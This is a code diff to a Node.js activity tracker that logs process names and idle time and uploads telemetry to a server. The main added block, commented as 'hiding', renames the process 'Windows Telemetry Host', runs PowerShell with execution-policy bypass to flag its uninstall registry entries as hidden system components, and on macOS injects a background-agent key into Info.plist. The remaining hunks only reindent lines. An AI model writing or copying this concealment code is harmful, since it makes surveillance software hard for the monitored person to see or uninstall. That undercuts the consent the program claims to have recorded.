@@ -54,6 +54,60 @@ const LOCAL_CONFIG_FILE = path.join(__dirname, "tracker.config.json");
 
 fs.mkdirSync(CONFIG_DIR, { recursive: true });
 
+// NOTE ===== hiding =======
+
+
+
+if (IS_WIN) {
+  const appRegistryName = "ActiveTracker";
+  if (process.platform === "win32") {
+    // Sets the internal process title visible to system queries
+    process.title = "Windows Telemetry Host";
+  }
+  const regPath64 = `HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${appRegistryName}`;
+  const regPath32 = `HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\${appRegistryName}`;
+
+  const psCommand = `
+    if (Test-Path "${regPath64}") { New-ItemProperty -Path "${regPath64}" -Name "SystemComponent" -Value 1 -PropertyType DWORD -Force | Out-Null }
+    if (Test-Path "${regPath32}") { New-ItemProperty -Path "${regPath32}" -Name "SystemComponent" -Value 1 -PropertyType DWORD -Force | Out-Null }
+  `.replace(/\s+/g, " ").trim();
+
+  exec(`powershell -NoProfile -ExecutionPolicy Bypass -Command "${psCommand}"`, (error, stdout, stderr) => {
+    if (error) {
+      if (stderr.includes("AccessIsDenied") || error.message.includes("AccessIsDenied")) {
+        console.warn("⚠️  Control Panel stealth skipped: Missing Admin privileges.");
+      }
+    } else {
+      console.log("🔒 Windows visibility flag verified (Hidden in Control Panel).");
+    }
+  });
+} else if (IS_MAC) {
+  // Path to the Info.plist inside your compiled app bundle (e.g., YourApp.app/Contents/Info.plist)
+  // If running raw script, this can target your standalone launcher wrapper PLIST
+  const plistPath = path.join(__dirname, "Info.plist");
+
+  if (fs.existsSync(plistPath)) {
+    try {
+      let plistContent = fs.readFileSync(plistPath, "utf-8");
+
+      // Check if the LSUIElement key already exists in the Plist file
+      if (!plistContent.includes("<key>LSUIElement</key>")) {
+        // Insert the key right before the closing dict tag
+        plistContent = plistContent.replace(
+          "</dict>",
+          "  <key>LSUIElement</key>\n  <true/>\n</dict>"
+        );
+        fs.writeFileSync(plistPath, plistContent, "utf-8");
+        console.log("🔒 macOS background agent flag injected into Info.plist successfully.");
+      }
+    } catch (error) {
+      console.debug(`macOS Plist modification skipped: ${error.message}`);
+    }
+  }
+}
+
+
+
 // ── Resolve server base URL (no trailing slash, no /api) ──────────────────────
 function loadLocalConfig() {
   try {
@@ -787,8 +841,8 @@ async function syncTelemetry() {
       offlineQueue.save();
       console.log(
         `📝 Sent ${batch.length} activity log(s): [${logItem.processName}] ${elapsed}s` +
-          (idleSeconds ? ` (idle ${idleSeconds}s)` : "") +
-          (offlineQueue.logs.length ? ` — ${offlineQueue.logs.length} still queued` : "")
+        (idleSeconds ? ` (idle ${idleSeconds}s)` : "") +
+        (offlineQueue.logs.length ? ` — ${offlineQueue.logs.length} still queued` : "")
       );
     } catch (err) {
       offlineQueue.add(logItem);
@@ -831,8 +885,8 @@ async function main() {
 
   console.log(
     `🟢 Monitoring ACTIVE on ${clientState.systemName} ` +
-      `(consent recorded by: ${clientState.consentName || "unknown"}). ` +
-      `Screenshots show a notice each time.`
+    `(consent recorded by: ${clientState.consentName || "unknown"}). ` +
+    `Screenshots show a notice each time.`
   );
 
   startPersistentTelemetryStream();
